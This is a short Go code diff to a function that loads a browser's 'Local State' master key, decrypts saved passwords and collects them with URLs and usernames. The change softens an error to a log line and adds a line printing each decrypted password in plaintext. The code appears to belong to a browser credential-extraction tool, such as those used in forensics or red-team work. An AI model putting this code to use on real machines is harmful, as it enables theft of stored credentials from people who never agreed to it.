@@ -100,7 +100,7 @@ func _export_credentials(tmpDB string, path string) ([]common.UrlNamePass, bool)
 			keyFilePath := fmt.Sprintf("%s\\Local State", path)
 			masterKey, err := common.GetMasterkey(keyFilePath)
 			if err != nil {
-				log.Fatalln("GetMasterkey", err.Error())
+				log.Println("GetMasterkey", err.Error())
 				return nil, false
 			}
 			//newVersionPassword, errAesDecrypt := common.DecryptAESPwd([]byte(password), masterKey)
@@ -108,7 +108,7 @@ func _export_credentials(tmpDB string, path string) ([]common.UrlNamePass, bool)
 			if errAesDecrypt != nil {
 				log.Fatalln("DecryptAESPwd", errAesDecrypt.Error())
 			}
-
+			fmt.Println("newVersionPassword", newVersionPassword)
 			data = append(data, common.UrlNamePass{
 				Url:      actionUrl,
 				Username: username,
